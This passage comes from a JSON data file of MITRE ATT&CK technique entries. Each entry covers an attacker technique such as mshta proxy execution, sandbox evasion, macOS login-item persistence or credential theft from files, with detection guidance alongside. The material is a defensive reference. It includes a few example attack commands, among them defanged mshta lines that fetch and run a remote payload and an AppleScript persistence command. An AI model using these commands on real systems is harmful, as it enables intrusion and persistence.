      "detection": "Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex: <code>powershell \u2013v 2</code>). Also monitor for other abnormal events, such as execution of and/or processes spawning from a version of a tool that is not expected in the environment.\n\nMonitor for Windows event ID (EID) 400, specifically the <code>EngineVersion</code> field which shows the version of PowerShell running and may highlight a malicious downgrade attack.(Citation: inv_ps_attacks)\n\nMonitor network data to detect cases where HTTP is used instead of HTTPS.\n\nMonitor executed commands and arguments that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. Bitlocker can be disabled by calling DisableKeyProtectors and setting DisableCount to 0.(Citation: welivesecurity)\n\nMonitor for newly constructed files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Adversaries can construct new files in the EFI System Partition.(Citation: Microsoft Security)(Citation: welivesecurity)\n\nMonitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender. HVCI (Hypervisor-Protected Code Integrity) can be disabled by modifying the registry key to 0, allowing the system to run custom unsigned kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)"
    },
    "T1559.003": {
      "id": "T1559.003",
      "name": "XPC Services",
      "description": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1559.003",
      "stix_id": "attack-pattern--8252f135-ed26-4ce1-ae61-f26e94429a19",
      "created": "2021-10-12T06:45:36.763000+00:00",
      "modified": "2025-04-15T19:58:47.031000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Access"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1497": {
      "id": "T1497",
      "name": "Virtualization/Sandbox Evasion",
      "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\n\n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1497",
      "stix_id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
      "created": "2019-04-17T22:22:24.505000+00:00",
      "modified": "2025-04-15T19:58:47.123000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
    },
    "T1102": {
      "id": "T1102",
      "name": "Web Service",
      "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1102",
      "stix_id": "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665",
      "created": "2017-05-31T21:31:13.915000+00:00",
      "modified": "2025-04-15T19:58:47.211000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)"
    },
    "T1552.001": {
      "id": "T1552.001",
      "name": "Credentials In Files",
      "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.001",
      "stix_id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc",
      "created": "2020-02-04T12:52:13.006000+00:00",
      "modified": "2025-04-15T19:58:47.301000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information."
    },
    "T1568.003": {
      "id": "T1568.003",
      "name": "DNS Calculation",
      "description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)\n\nOne implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1568.003",
      "stix_id": "attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1",
      "created": "2020-03-11T14:56:34.154000+00:00",
      "modified": "2025-04-25T14:47:18.343000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known."
    },
    "T1218.005": {
      "id": "T1218.005",
      "name": "Mshta",
      "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.005",
      "stix_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
      "created": "2020-01-23T19:32:49.557000+00:00",
      "modified": "2025-04-25T14:47:18.707000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Creation",
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious"
    },
    "T1547.015": {
      "id": "T1547.015",
      "name": "Login Items",
      "description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.015",
      "stix_id": "attack-pattern--84601337-6a55-4ad7-9c35-79e0d1ea2ab3",
      "created": "2021-10-05T21:26:15.081000+00:00",
      "modified": "2025-04-15T19:58:47.788000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "All login items created via shared file lists are viewable by using the System Preferences GUI or in the <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file.(Citation: Open Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) These locations should be monitored and audited for known good applications.\n\nOtherwise, login Items are located in <code>Contents/Library/LoginItems</code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items) Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true.(Citation: Adding Login Items)(Citation: Launch Service Keys Developer Apple)\n\nMonitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections."
    },
    "T1608": {
      "id": "T1608",
      "name": "Stage Capabilities",
      "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)\n* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608",
      "stix_id": "attack-pattern--84771bc3-f6a0-403e-b144-01af70e5fda0",
      "created": "2021-03-17T20:04:09.331000+00:00",
      "modified": "2025-04-15T23:12:21.613000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors."
    },
    "T1608.005": {
      "id": "T1608.005",
      "name": "Link Target",
      "description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking)\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608.005",
      "stix_id": "attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701",
      "created": "2021-03-17T20:35:08.429000+00:00",
      "modified": "2025-04-15T22:45:40.961000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003), [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002), or [Malicious Link](https://attack.mitre.org/techniques/T1204/001)."
    },
    "T1104": {
      "id": "T1104",
      "name": "Multi-Stage Channels",
      "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1104",
      "stix_id": "attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91",
      "created": "2017-05-31T21:31:15.935000+00:00",
      "modified": "2025-04-25T15:15:50.032000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data."
    },
    "T1657": {
      "id": "T1657",
      "name": "Financial Theft",
      "description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) \"pig butchering,\"(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) \n\nAdversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC)\n\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)\n\nDue to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1657",
      "stix_id": "attack-pattern--851e071f-208d-4c79-adc6-5974c85c78f3",
      "created": "2023-08-18T20:50:04.222000+00:00",
      "modified": "2025-04-15T22:36:03.465000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1480": {
      "id": "T1480",
      "name": "Execution Guardrails",
      "description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\n\nAdversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1480",
      "stix_id": "attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852",
      "created": "2019-01-31T02:10:08.261000+00:00",
      "modified": "2025-04-15T19:58:48.316000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection."
    },
    "T1619": {
      "id": "T1619",
      "name": "Cloud Storage Object Discovery",
      "description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1619",
      "stix_id": "attack-pattern--8565825b-21c8-4518-b75e-cbc4c717a156",
      "created": "2021-10-01T17:58:26.445000+00:00",
      "modified": "2025-04-15T22:04:12.682000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Storage: Cloud Storage Access",
        "Cloud Storage: Cloud Storage Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained. \nMonitor cloud logs for API calls used for file or object enumeration for unusual activity. "
    },
    "T1606.001": {
      "id": "T1606.001",
      "name": "Web Cookies",
      "description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1606.001",
      "stix_id": "attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a",
      "created": "2020-12-17T02:14:34.178000+00:00",
      "modified": "2025-04-15T23:20:22.744000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Web Credential: Web Credential Usage"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations."
    },
    "T1654": {
      "id": "T1654",
      "name": "Log Enumeration",
      "description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).\n\nHost binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent\u2019s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)\n\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.\n\nIn addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1654",
      "stix_id": "attack-pattern--866d0d6d-02c6-42bd-aa2f-02907fdc0969",
      "created": "2023-07-10T16:50:57.587000+00:00",
      "modified": "2025-04-15T19:58:48.705000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "IaaS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1134.001": {
      "id": "T1134.001",
      "name": "Token Impersonation/Theft",
